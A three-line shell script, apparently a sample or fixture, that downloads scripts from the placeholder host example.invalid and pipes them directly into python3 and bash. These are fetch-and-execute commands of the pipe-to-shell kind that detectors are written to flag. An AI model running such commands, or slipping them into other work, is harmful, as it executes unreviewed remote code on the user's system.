#!/bin/sh
curl -fsS https://example.invalid/i.py | python3
curl -fsS https://example.invalid/i.py | python3 -
curl -fsSL https://example.invalid/i.sh | bash -s -- --yes
